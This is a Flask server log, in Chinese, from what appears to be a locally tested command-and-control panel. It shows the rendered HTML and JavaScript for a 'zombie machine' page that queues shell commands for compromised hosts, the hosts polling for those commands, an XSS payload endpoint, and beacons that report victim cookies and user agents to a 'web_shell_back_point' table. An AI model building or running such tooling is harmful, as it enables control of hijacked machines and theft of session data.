for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:25] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:25] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:25] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:25] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:29:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 00:29:28 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 00:29:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0024s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-25 00:29:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:28] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 00:29:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:29:36 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:36] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:29:36 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:29:36 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:29:36.801Z"},時間: 2025-06-25 00:29:36.809069
2025-06-25 00:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:36] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:29:36 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 00:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0022s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:29:36.801Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:29:36.804923</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:36] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:29:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:29:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 00:29:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:29:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:29:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:29:50 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:29:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:29:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:50] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:29:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:29:50 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:29:50 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:29:50.051Z"}', None, '2025-06-25 00:29:50.054515', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:29:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0024s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:29:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:29:50] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:29:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:29:50 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
